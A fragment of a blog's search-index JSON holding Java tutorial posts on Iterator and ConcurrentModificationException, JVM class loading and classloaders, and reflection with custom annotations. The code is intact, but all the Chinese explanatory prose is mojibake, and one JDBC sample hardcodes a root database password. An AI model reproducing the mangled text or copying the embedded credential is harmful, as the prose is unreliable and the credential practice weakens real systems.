&lt;/manifestEntries&gt; &lt;/transformer&gt; &lt;/transformers&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;","categories":[],"tags":[{"name":"maven","slug":"maven","permalink":"http://yoursite.com/tags/maven/"}]},{"title":"javaä¸­foreachå’Œiterator","slug":"javaä¸­foreachå’Œiterator","date":"2020-08-07T05:45:07.000Z","updated":"2020-11-14T17:10:35.611Z","comments":true,"path":"2020/08/07/javaä¸­foreachå’Œiterator/","link":"","permalink":"http://yoursite.com/2020/08/07/java%E4%B8%ADforeach%E5%92%8Citerator/","excerpt":"","text":"javaä¸­foreachå…¥é—¨ä»Šå¤©é—²æ¥æ— äº‹ï¼Œå¸ˆçˆ¶è®©æˆ‘çœ‹ä¸€ä¸‹ï¼Œè¿­ä»£å™¨åœ¨ä¸€ä¸ªå¾ªç¯é‡Œé¢è¿ç»­ä¸¤æ¬¡iterator.remove()çš„é—®é¢˜ï¼Œå› ä¸ºä»Šå¤©çœ‹ä¸€ä¸ªç¦»èŒäººå‘˜çš„ä»£ç ï¼Œé‡Œé¢å†™äº†è¿™ä¸ªã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹æµ‹è¯•ä»£ç ï¼š List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); list.add(4); for (Integer value:list){ logger.debug(value); } //è¾“å‡º 2020-08-07 09:58:12,323 DEBUG (com.huskyui.App:main) -1 2020-08-07 09:58:12,324 DEBUG (com.huskyui.App:main) -2 2020-08-07 09:58:12,325 DEBUG (com.huskyui.App:main) -3 2020-08-07 09:58:12,325 DEBUG (com.huskyui.App:main) -4åç¼–è¯‘æ–‡ä»¶ List&lt;Integer&gt; list = new ArrayList(); list.add(1); list.add(2); list.add(3); list.add(4); Iterator var2 = list.iterator(); while(var2.hasNext()) { Integer value = (Integer)var2.next(); logger.debug(value); } // ç”Ÿæˆè¿­ä»£å™¨iteratorè¿­ä»£å™¨é‡Œé¢çš„ä»‹ç»æ˜¯ï¼š_Iterators allow the caller to remove elements from the underlyingcollection during the iteration with well-definedsemantics._è¿­ä»£å™¨å…è®¸è°ƒç”¨è€…åœ¨è¿­ä»£æœŸé—´ä½¿ç”¨å®šä¹‰è‰¯å¥½çš„è¯­ä¹‰ä»åŸºç¡€é›†åˆä¸­åˆ é™¤å…ƒç´ . List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); list.add(4); Iterator iterator = list.iterator(); logger.debug(&quot;Iterator ä»å‰å‘åéå†:&quot;); while (iterator.hasNext()){ Integer value = (Integer)iterator.next(); logger.debug(value); } // å¢å¼ºç‰ˆiterator listIterator logger.debug(&quot;listIteratorä»å‰å‘åéå†&quot;); ListIterator iterator1 = list.listIterator(); while (iterator1.hasNext()){ Integer value = (Integer)iterator1.next(); logger.debug(value); } logger.debug(&quot;listIteratorä»åå‘å‰éå†ï¼š&quot;); while (iterator1.hasPrevious()){ logger.debug(iterator1.previous()); } /** 2020-08-07 11:07:44,832 DEBUG (com.huskyui.App:main) -Iterator ä»å‰å‘åéå†: 2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -1 2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -2 2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -3 2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -4 2020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -listIteratorä»å‰å‘åéå† 2020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -1 2020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -2 2020-08-07 11:07:44,837 DEBUG (com.huskyui.App:main) -3 2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -4 2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -listIteratorä»åå‘å‰éå†ï¼š 2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -4 2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -3 2020-08-07 11:07:44,839 DEBUG (com.huskyui.App:main) -2 2020-08-07 11:07:44,839 DEBUG (com.huskyui.App:main) -1 */ç»å…¸å‡ºé”™ List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); list.add(4); for (Integer value :list){ System.out.println(value); if(value.equals(1)){ list.remove(value); } } // åç¼–è¯‘ List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); list.add(4); Iterator iterator = list.iterator(); while (iterator.hasNext()){ Integer value = (Integer)iterator.next(); System.out.println(value); if(value.equals(1)){ list.remove(value); } } // å‡ºé”™ // 1 // Exception in thread &quot;main&quot; java.util.ConcurrentModificationException // at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:909) // at java.util.ArrayList$Itr.next(ArrayList.java:859) // at com.huskyui.App.main(App.java:24) // æˆ‘ä»¬æ¥çœ‹iteratoråœ¨ArrayListçš„å®ç° private class Itr implements Iterator&lt;E&gt; { int cursor; // index of next element to return int lastRet = -1; // index of last element returned; -1 if no such int expectedModCount = modCount; Itr() {} // cursorå°±æ˜¯æ¸¸æ ‡çš„å¤§æ¦‚æ„æ€ï¼Œsizeæ˜¯ArrayListçš„å®¹é‡ public boolean hasNext() { return cursor != size; } @SuppressWarnings(&quot;unchecked&quot;) public E next() { // æŠ¥é”™æ˜¯åœ¨è¿™é‡Œ checkForComodification(); int i = cursor; if (i &gt;= size) throw new NoSuchElementException(); Object[] elementData = ArrayList.this.elementData; if (i &gt;= elementData.length) throw new ConcurrentModificationException(); cursor = i + 1; // ç»™lastRetè´Ÿè´£ï¼Œæœ‰ç‚¹preèŠ‚ç‚¹çš„å‘³é“äº† return (E) elementData[lastRet = i]; } public void remove() { if (lastRet &lt; 0) throw new IllegalStateException(); checkForComodification(); try { ArrayList.this.remove(lastRet); // æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹ cursor = lastRet; // lastRetèµ‹åˆå§‹å€¼ï¼Œåœ¨åç»­æ‰§è¡Œnext()æ–¹æ³•æ˜¯å¯ä»¥é‡æ–°èµ‹å€¼ lastRet = -1; expectedModCount = modCount; } catch (IndexOutOfBoundsException ex) { throw new ConcurrentModificationException(); } } // è¿™ä¸ªmodCountæ˜¯ArrAyListç»§æ‰¿çš„AbstractListä¸­çš„å˜é‡ï¼Œè®°å½•è¿™ä¸ªarrayListçš„ä¿®æ”¹æ¬¡æ•°ã€‚è­¬å¦‚æˆ‘ä»¬æ·»åŠ äº†4æ¬¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå°±æ˜¯4 final void checkForComodification() { if (modCount != expectedModCount) throw new ConcurrentModificationException(); }ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸èƒ½åœ¨éå†æ—¶ï¼Œåˆ é™¤ï¼Œå› ä¸ºarrayListçš„removeæ—¶ï¼Œå¹¶æ²¡æœ‰ä¿®æ”¹exceptedModCount,è€Œiteratorå´å¯ä»¥ã€‚ å…³äºforeachä¸¤ç§æ–¹å¼foreachæ”¯æŒ1.å®ç°äº†Iteratoræ¥å£çš„2.æ•°ç»„ç¬¬ä¸€ç§ï¼ŒIteratoråç¼–è¯‘åï¼Œå°±æ˜¯ä½¿ç”¨Iteratorè¿­ä»£å™¨æ¥å®ç°çš„ç¬¬äºŒç§ï¼Œæ•°ç»„å½¢å¼çš„foreach int[] array = new int[]{1,2,3,4,5}; for (int num:array){ System.out.println(num); } // åç¼–è¯‘å int[] array = new int[]{1, 2, 3, 4, 5}; int[] var2 = array; int var3 = array.length; for(int var4 = 0; var4 &lt; var3; ++var4) { int num = var2[var4]; System.out.println(num); }å‚è€ƒ JavaåŸºç¡€8ï¼šIteratorå’Œforeachå¾ªç¯","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"JVMç±»åŠ è½½å­ç³»ç»Ÿ","slug":"JVMç±»åŠ è½½å­ç³»ç»Ÿ","date":"2020-07-12T17:29:25.000Z","updated":"2020-11-14T17:10:36.450Z","comments":true,"path":"2020/07/13/JVMç±»åŠ è½½å­ç³»ç»Ÿ/","link":"","permalink":"http://yoursite.com/2020/07/13/JVM%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%AD%90%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"åœ¨çº¦ç¿°Â·å†¯Â·è¯ºä¼Šæ›¼çš„è®¡ç®—æœºæ¨¡å‹ä¸­ï¼Œä»»ä½•ç¨‹åºéƒ½éœ€è¦åŠ è½½åˆ°å†…å­˜æ‰èƒ½ä¸CPUè¿›è¡Œäº¤æµã€‚ åŠ è½½è¿‡ç¨‹load æ ¹æ®ä¸€ä¸ªç±»çš„å…¨é™ç±»åæ¥è·å–æ­¤ç±»çš„äºŒè¿›åˆ¶æµï¼ˆæ­¤å¤„å¹¶æ²¡æœ‰è¯´æ˜¯ç‰¹æŒ‡çš„æœ¬åœ°classæ–‡ä»¶ï¼‰ å°†è¿™ä¸ªclassæ–‡ä»¶æ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬åŒ–ä¸ºæ–¹æ³•åŒºä¸­çš„è¿è¡Œæ—¶ç»“æ„ åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªjava.lang.Class å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°†ä½œä¸ºç¨‹åºè®¿é—®æ–¹æ³•åŒºä¸­çš„ç±»å‹æ•°æ®çš„å¤–éƒ¨æ¥å£ å…¶ä¸­æ­¤ç±»çš„äºŒè¿›åˆ¶æµï¼Œä¸ä»…ä»…æ˜¯æœ¬åœ°çš„.classæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä»jarï¼ŒwaråŒ…ä¸­çš„ï¼Œæˆ–è€…ä½¿ç”¨javaè‡ªå¸¦çš„åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†ï¼Œæˆ–è€…åŸºäºcglibåŠ¨æ€ç”Ÿæˆçš„äºŒè¿›åˆ¶æµï¼Œæˆ–è€…æ˜¯è€å¼çš„jspï¼Œä»¥åŠåŠ å¯†è§£å¯†çš„classæ–‡ä»¶ç­‰ç­‰ è¿æ¥linkè¿æ¥åˆ†ä¸ºä¸‰ä¸ªï¼šéªŒè¯ï¼Œå‡†å¤‡ï¼Œè§£æ éªŒè¯verificationéªŒè¯æ˜¯ä¸ºäº†è¿è¡Œå½“å‰ä»£ç ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ æ–‡ä»¶æ ¼å¼éªŒè¯ ï¼š1.æ˜¯å¦æ˜¯ä»¥0xCAFEBABEå¼€å¤´2.ç‰ˆæœ¬å·æ˜¯å¦åœ¨java ã€‚ã€‚ã€‚ã€‚ä¸‹é¢å°±ä¸å¤šèµ˜è¿° å‡†å¤‡prepareä¸ºç±»å˜é‡ï¼ˆå³é™æ€å˜é‡ï¼Œè¢«staticä¿®é¥°çš„å˜é‡ï¼‰åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡åˆå§‹åŒ–ã€‚ ä½†æ˜¯å¸¸é‡ï¼ˆfinalä¿®é¥°ï¼‰åœ¨ç¼–è¯‘javacå°†å¸¸é‡ç”ŸæˆConstantValueå±æ€§ï¼Œåœ¨å‡†å¤‡é˜¶æ®µæ ¹æ®ConstantValueè®¾ç½®èµ‹å€¼ã€‚ è§£æjavaè™šæ‹Ÿæœºå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹ã€‚ åˆå§‹åŒ– åˆå§‹åŒ–é˜¶æ®µä¼šæ‰§è¡Œ &lt;clinit&gt; æ–¹æ³• è°ƒç”¨ clinit æ–¹æ³•å‰ä¼šè°ƒç”¨å…¶çˆ¶ç±»çš„ clinit çš„æ–¹æ³•ï¼Œæœ€åˆè°ƒç”¨åº”è¯¥æ˜¯ java.lang.object çš„ clinit æ–¹æ³• å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¼šç«äº‰ clinit æ–¹æ³•ï¼ˆè¦é¿å…clinitæ˜¯ä¸ªæ­»é”ï¼‰ clinit ä¸»è¦æ˜¯å¯¹è¢«staticä¿®é¥°çš„å˜é‡å’Œé™æ€ä»£ç å—è¿›è¡Œèµ‹å€¼ã€‚å¦‚æœéƒ½ä¸å­˜åœ¨ï¼Œå°±æ²¡æœ‰ clinit åˆå§‹åŒ–6ç§æƒ…å†µ é‡åˆ°newã€getstaticã€putstaticã€æˆ–invokestaticè¿™ä¸ª4ä¸ªæŒ‡ä»¤ï¼Œå¦‚æœç±»å‹æ²¡åˆå§‹åŒ–è¿‡ï¼Œå°±ä¼šåˆå§‹åŒ–ä¸€ä¸‹ é€šè¿‡åå°„è°ƒç”¨æ—¶ï¼Œå¦‚æœæ²¡æœ‰åˆå§‹åŒ–å°±ä¼šåˆå§‹åŒ–ä¸€ä¸‹ // è¿™æ˜¯java mysql jdbcæœ€åŸºæœ¬çš„æ–¹å¼ // ä¼šé€šè¿‡ç±»åŠ è½½æœºåˆ¶ï¼Œæ‰§è¡Œstaticæ–¹æ³•å—ï¼Œåœ¨DriverMangeré‡Œé¢æ³¨å†Œä¸€ä¸ªMysqlé©±åŠ¨ Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); Connection connection = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/test_index?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC&quot;,&quot;root&quot;,&quot;happyday&quot;); Statement statement = connection.createStatement(); ResultSet resultSet = statement.executeQuery(&quot;select * from test limit 10&quot;); while (resultSet.next()){ System.out.println(resultSet.getInt(&quot;id&quot;)); } //æˆ‘ä»¬æ¥çœ‹ä¸‹ï¼Œè¿™ä¸ªcom.mysql.cj.jdbc.Driveré‡Œé¢çš„clinit static { try { java.sql.DriverManager.registerDriver(new Driver()); } catch (SQLException E) { throw new RuntimeException(&quot;Can&apos;t register driver!&quot;); } } å½“åˆå§‹åŒ–ç±»çš„æ—¶å€™ï¼Œå¦‚æœçˆ¶ç±»æ²¡æœ‰åˆå§‹åŒ–ï¼Œä¼šè§¦å‘çˆ¶ç±»çš„çš„åˆå§‹åŒ– public class ClinitTest1 { static class Father{ public static int a = 1; static { a = 2; } } static class Son extends Father{ public static int b = a; } public static void main(String[] args) { System.out.println(Son.b); } } // è¾“å‡º 2 å½“è™šæ‹Ÿæœºå¯åŠ¨æ—¶ï¼Œç”¨æˆ·éœ€è¦çš„æŒ‡å®šä¸€ä¸ªè¦æ‰§è¡Œçš„ä¸»ç±»ï¼ˆåŒ…å«mainï¼ˆï¼‰ï¼‰ï¼Œè™šæ‹Ÿæœºä¼šåŠ è½½è¿™ä¸ªç±» // æˆ‘ä¸¾äº†ä¸€ä¸ªä¸çŸ¥æ°ä¸æ°å½“çš„ä¾‹å­ï¼Œé€šè¿‡æ•°ç»„å®šä¹‰å¼•ç”¨ç±»å¹¶ä¸ä¼šè§¦å‘æ­¤ç±»çš„åˆå§‹åŒ– public class TestClass { static { System.out.println(&quot;static method&quot;); } public static void main(String[] args) { TestClass[] testClasses = new TestClass[10]; } } // è¾“å‡º static method public class TestClass2 { public static void main(String[] args) { TestClass[] testClasses = new TestClass[10]; } } // æ— è¾“å‡º å½“ä½¿ç”¨JDK 7æ–°åŠ å…¥çš„åŠ¨æ€è¯­è¨€æ”¯æŒæ—¶ï¼Œå¦‚æœä¸€ä¸ªjava.lang.invoke.MethodHandleå®ä¾‹æœ€åçš„è§£æç»“æœä¸ºREF_getStaticã€REF_putStaticã€REF_invokeStaticã€REF_newInvokeSpecialå››ç§ç±»å‹çš„æ–¹æ³•å¥æŸ„ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•å¥æŸ„å¯¹åº”çš„ç±»æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚ å½“ä¸€ä¸ªæ¥å£ä¸­å®šä¹‰äº†JDK 8æ–°åŠ å…¥çš„é»˜è®¤æ–¹æ³•ï¼ˆè¢«defaultå…³é”®å­—ä¿®é¥°çš„æ¥å£æ–¹æ³•ï¼‰æ—¶ï¼Œå¦‚æœæœ‰è¿™ä¸ªæ¥å£çš„å®ç°ç±»å‘ç”Ÿäº†åˆå§‹åŒ–ï¼Œé‚£è¯¥æ¥å£è¦åœ¨å…¶ä¹‹å‰è¢«åˆå§‹åŒ– ä¸¾ä¾‹public class ClassInitTest { private static int num ; static { num = 2; number = 20; System.out.println(num); // System.out.println(number);éæ³•å‰åƒå¼•ç”¨ } private static int number = 10; public static void main(String[] args) { System.out.println(num); System.out.println(number); } } // è¾“å‡º /** 2 2 10 */ /** clinitæ–¹æ³• 0 iconst_2 1 putstatic #2 &lt;org/example/jvm/classload/ClassInitTest.num&gt; 4 bipush 20 6 putstatic #3 &lt;org/example/jvm/classload/ClassInitTest.number&gt; 9 getstatic #4 &lt;java/lang/System.out&gt; 12 getstatic #2 &lt;org/example/jvm/classload/ClassInitTest.num&gt; 15 invokevirtual #5 &lt;java/io/PrintStream.println&gt; 18 bipush 10 20 putstatic #3 &lt;org/example/jvm/classload/ClassInitTest.number&gt; 23 return */ /** åç¼–è¯‘çš„classæ–‡ä»¶ // // Source code recreated from a .class file by IntelliJ IDEA // (powered by Fernflower decompiler) // package org.example.jvm.classload; public class ClassInitTest { private static int num = 2; private static int number = 20; public ClassInitTest() { } public static void main(String[] args) { System.out.println(num); System.out.println(number); } static { System.out.println(num); number = 10; } } */è¿˜æœ‰å¾ˆå¤šæˆ‘æ²¡æœ‰ä¸¾ä¾‹åˆ°ï¼Œå¦‚å¤šçº¿ç¨‹ç«äº‰staticæ–¹æ³•ï¼Œæ•°ç»„ã€‚ã€‚ã€‚ ç±»åŠ è½½å™¨java å›¢é˜Ÿæœ‰æ„æŠŠç±»çš„åŠ è½½é˜¶æ®µçš„â€œé€šè¿‡ä¸€ä¸ªç±»çš„å…¨é™å®šåæ¥è·å–æè¿°è¯¥ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµâ€æ”¾åˆ°javaè™šæ‹Ÿæœºå¤–éƒ¨å®ç°ï¼Œä»¥ä¾¿è®©ç¨‹åºè‡ªå·±å†³å®šå»è·å–æ‰€éœ€ç±»ã€‚ è¿™ä¸ªæ—¶å€™ï¼Œå¦‚æœæ˜¯ä¸¤ä¸ªå¯¹è±¡æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰çš„å‰æå¿…é¡»æ˜¯åŒä¸€ä¸ªç±»åŠ è½½å™¨åŠ è½½æ¯”è¾ƒæ‰æœ‰æ„ä¹‰ã€‚ public class ClassLoaderTest { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException { ClassLoader classLoader = new ClassLoader() { @Override public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException { try { String fileName = name.substring(name.lastIndexOf(&quot;.&quot;) + 1) + &quot;.class&quot;; InputStream is = getClass().getResourceAsStream(fileName); if (is == null) { return super.loadClass(name); } byte[] b = new byte[is.available()]; is.read(b); return defineClass(name, b, 0, b.length); } catch (IOException e) { e.printStackTrace(); } return null; } }; Object obj = classLoader.loadClass(&quot;org.example.jvm.classload.ClassLoaderTest&quot;).newInstance(); System.out.println(obj); System.out.println(obj instanceof org.example.jvm.classload.ClassLoaderTest); Object obj2 = new ClassLoaderTest(); System.out.println(obj2 instanceof org.example.jvm.classload.ClassLoaderTest); } } // è¾“å‡º org.example.jvm.classload.ClassLoaderTest@6e0be858 false trueç±»åŠ è½½å™¨æ¨¡å‹ ![UGJk7D.png](http://qjrzrivoh.hd-bkt.clouddn.com/1605373836.27754478999.png) public class ClassLoaderTest { public static void main(String[] args) { // è·å–ç³»ç»Ÿç±»åŠ è½½å™¨ ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); System.out.println(systemClassLoader);// sun.misc.Launcher$AppClassLoader@18b4aac2 // è·å–æ‰©å±•ç±»åŠ è½½å™¨ ClassLoader extClassLoader = systemClassLoader.getParent(); System.out.println(extClassLoader);// sun.misc.Launcher$ExtClassLoader@135fbaa4 // è¯•å›¾è·å–bootstrap classloader ä½†æ²¡æœ‰è·å–åˆ°ä¸ºç©º System.out.println(extClassLoader.getParent()); // String æ˜¯é€šè¿‡å¼•å¯¼ç±»æ¥è·å–çš„==&gt;java æ ¸å¿ƒåº“éƒ½æ˜¯é€šè¿‡bootstrap class loader æ¥å¼•å¯¼çš„ System.out.println(String.class.getClassLoader()); // sun.misc.Launcher$AppClassLoader@18b4aac2 System.out.println(ClassLoaderTest.class.getClassLoader()); } } // è¾“å‡º sun.misc.Launcher$AppClassLoader@18b4aac2 sun.misc.Launcher$ExtClassLoader@4b67cf4d null null sun.misc.Launcher$AppClassLoader@18b4aac2å„ä¸ªç±»åŠ è½½å™¨çš„èŒè´£ Bootstrap Class Loader : åŠ è½½æ ¸å¿ƒåº“ï¼ˆJAVA_HOME/jre/lib/rt.jarå’Œresources.jarå’Œsun.boot.classï¼‰,æ˜¯é€šè¿‡c++ç¼–å†™ï¼Œjavaè·å–æ—¶æ˜¯nullï¼Œè­¬å¦‚String.classå°±Bootstarp Class LoaderåŠ è½½çš„ Extension Class Loaderï¼š åŠ è½½æ‰©å±•åº“ï¼ˆjava.ext.dirsæˆ–jre/lib/extåŒ…ï¼‰ Application Class Loader:åŠ è½½ç”¨æˆ·è‡ªå®šä¹‰çš„ç±» åŒäº²å§”æ´¾æœºåˆ¶åŒäº²å§”æ´¾æ¨¡å‹åº”è¯¥æ˜¯å«æº¯æºå§”æ´¾åŠ è½½æ¨¡å‹ï¼Œèµ·åˆåŠ è½½ç±»æ—¶ï¼Œæ˜¯ä¾æ¬¡å‘ä¸Šè¯¢é—®æ˜¯å¦å·²åŠ è½½è¿‡ï¼Œç„¶åå†å‘ä¸‹é€å±‚è¯¢é—®æ˜¯å¦å¯åŠ è½½ã€‚ä¸€èˆ¬åœ¨ä¸»æµä¸­é—´ä»¶éƒ½æœ‰è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œå®ç°ç±»çš„éš”ç¦»ï¼Œé˜²æ­¢å†²çªã€‚ ä»€ä¹ˆæƒ…å†µéœ€è¦è‡ªå®šä¹‰ç±»åŠ è½½å™¨ éš”ç¦»åŠ è½½ç±»ï¼šåœ¨æŸäº›å®¹å™¨æ¡†æ¶ç±»è¿›è¡Œä¸­é—´ä»¶å’Œåº”ç”¨çš„éš”ç¦»ï¼ŒæŠŠç±»åŠ è½½åˆ°ä¸åŒç¯å¢ƒã€‚è­¬å¦‚mybatisä¸­org/apache/ibatis/ioä¸­å°±æœ‰è‡ªå®šä¹‰ç±»åŠ è½½å™¨ é˜²æ­¢æºç æ³„éœ²ï¼šclass æ–‡ä»¶å¦‚æœæ­£å¸¸jaråŒ…åç¼–è¯‘ï¼Œè§£å‹ä¸€ä¸‹å°±å¯ä»¥çœ‹è§æºç ï¼Œæ‰€ä»¥éœ€è¦ç¼–è¯‘åŠ å¯†ï¼Œå¹¶ä¸”è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ¥å®ç°è§£å¯†è¿˜åŸå­—èŠ‚ç ã€‚ ç­‰ç­‰ å‚è€ƒ ã€Šç å‡ºé«˜æ•ˆã€‹ ã€Šæ·±å…¥ç†è§£JVMè™šæ‹Ÿæœºã€‹ å°šç¡…è°·JVMè§†é¢‘","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"http://yoursite.com/tags/JVM/"}]},{"title":"åå°„ä¸æ³¨è§£","slug":"åå°„ä¸æ³¨è§£","date":"2020-07-09T14:14:18.000Z","updated":"2020-11-14T17:10:36.978Z","comments":true,"path":"2020/07/09/åå°„ä¸æ³¨è§£/","link":"","permalink":"http://yoursite.com/2020/07/09/%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/","excerpt":"","text":"è·å–Classç±»çš„å®ä¾‹a) è‹¥å·²çŸ¥å…·ä½“çš„ç±»ï¼Œé€šè¿‡ç±»çš„classå±æ€§è·å–ï¼Œè¯¥æ–¹æ³•æœ€ä¸ºå®‰å…¨å¯é ï¼Œç¨‹åºæ€§èƒ½æœ€é«˜ Class clazz = Person.class;b) è‹¥å·²çŸ¥æŸä¸ªç±»çš„å®ä¾‹ï¼Œè°ƒç”¨è¯¥å®ä¾‹çš„getClass()æ–¹æ³•è·å–Classå¯¹è±¡ Class clazz = person.getClass();cï¼‰å·²çŸ¥ä¸€ä¸ªç±»çš„å…¨ç±»åï¼Œä¸”è¯¥ç±»åœ¨ç±»è·¯å¾„ä¸‹ï¼Œå¯ä»¥é€šè¿‡Classçš„é™æ€æ–¹æ³•forName()è·å–ï¼Œå¯èƒ½ä¼šæŠ›å‡ºClassNotFoundException Class clazz = Class.forName(&quot;com.test.Person&quot;);d) å†…ç½®åŸºæœ¬æ•°æ®ç±»å‹å¯ä»¥ç›´æ¥ä½¿ç”¨ç±»å.Type e) è¿˜å¯ä»¥ä½¿ç”¨ClassLoaderæˆ‘ä»¬ä¹‹åè®²è§£ åå°„å¤§è‡´ä½¿ç”¨public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class clazz = Class.forName(&quot;org.example.reflection.User&quot;); Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class,int.class); User user = (User)constructor.newInstance(&quot;huskyui&quot;,18,1); System.out.println(user); // getMethod å…¥å‚æ˜¯null,å¹¶ä¸”æ˜¯public Method getName = clazz.getMethod(&quot;getName&quot;,null); System.out.println(getName.invoke(user,null)); // setName å…¥å‚æ˜¯Stringç±»å‹ï¼Œä½†æ˜¯æ˜¯privateä¿®é¥°çš„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨declaredMethod()ï¼Œå¹¶ä¸”ä½¿ç”¨setAccessible(true) Method method = clazz.getDeclaredMethod(&quot;setName&quot;, String.class); method.setAccessible(true); method.invoke(user,&quot;adios&quot;); System.out.println(user); System.out.println(getName.invoke(user,null)); }æ³¨è§£// å…ƒæ³¨è§£ ç”¨äºä¿®é¥°æ³¨è§£ åœ¨java.lang.annotationbåŒ…ä¸‹æ³¨è§£ @Target // éœ€è¦ä¼ å…¥å½“å‰æ³¨è§£çš„ï¼Œé‡Œé¢çš„å€¼æœ‰ TYPE(class ç”¨),FIELD(å­—æ®µ),METHOD..... @Document // å¦‚æœæœ‰è¿™ä¸ªæ³¨è§£ï¼Œä¼šå…¶æ³¨é‡Šæˆä¸ºå¸¦æ³¨é‡Šå…ƒç´ çš„å…¬å…±APIçš„ä¸€éƒ¨åˆ† @Retention // æŒ‡ç¤ºæ³¨è§£è¦ä¿ç•™å¤šé•¿æ—¶é—´ï¼Œé»˜è®¤æ˜¯RetentionPolicy.ClASSï¼Œä¸€èˆ¬å†™æ˜¯RetentionPolicy.RUNIME @Inherited // ä¸¾ä¾‹@Target(ElementType.FIELD) @Retention(value= RetentionPolicy.RUNTIME) public @interface FieldWang { String fieldName(); String type(); int length(); String value() default &quot;hhhh&quot;; } @Target(value = {ElementType.TYPE}) @Retention(value = RetentionPolicy.RUNTIME) public @interface TableWang { String value(); } @TableWang(&quot;db_user&quot;) public class User { @FieldWang(fieldName = &quot;user_name&quot;,type = &quot;varchar&quot;,length = 10) private String name; @FieldWang(fieldName = &quot;user_age&quot;,type = &quot;int&quot;,length=10) private int age; @FieldWang(fieldName = &quot;user_id&quot;,type = &quot;int&quot;,length=11) private int id; public User(String name, int age, int id) { this.name = name; this.age = age; this.id = id; } @Override public String toString() { final StringBuilder sb = new StringBuilder(&quot;User{&quot;); sb.append(&quot;name=&apos;&quot;).append(name).append(&apos;\\&apos;&apos;); sb.append(&quot;, age=&quot;).append(age); sb.append(&quot;, id=&quot;).append(id); sb.append(&apos;}&apos;); return sb.toString(); } public String getName() { return name; } private void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public int getId() { return id; } public void setId(int id) { this.id = id; } } public static void main(String[] args) throws ClassNotFoundException { Class clazz = Class.forName(&quot;org.example.reflection.User&quot;); if(clazz.isAnnotationPresent(TableWang.class)){ TableWang tableWang = (TableWang) clazz.getAnnotation(TableWang.class); System.out.println(tableWang.value()); } for (Field field : clazz.getDeclaredFields()) { if (field.isAnnotationPresent(FieldWang.class)) { FieldWang fieldWang = (FieldWang)field.getAnnotation(FieldWang.class); System.out.println(field.getName()+ &quot; &quot;+ fieldWang.fieldName() + &quot; &quot; + fieldWang.type() + &quot; &quot; + fieldWang.length()); } } } // è¾“å‡º /** db_user name user_name varchar 10 age user_age int 10 id user_id int 11 */ä¸¾ä¾‹Mybatisä¸­çš„@Select@Documented @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) @Repeatable(Select.List.class) public @interface Select { /** * Returns an SQL for retrieving record(s). * * @return an SQL for retrieving record(s) */ String[] value(); /** * @return A database id that correspond this statement * @since 3.5.5 */ String databaseId() default &quot;&quot;; /** * The container annotation for {@link Select}. * @author Kazuki Shimizu * @since 3.5.5 */ @Documented @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) @interface List { Select[] value(); } } @Select(&quot;select * from test where id = 1 for update&quot;) Test selectForUpdate(); // 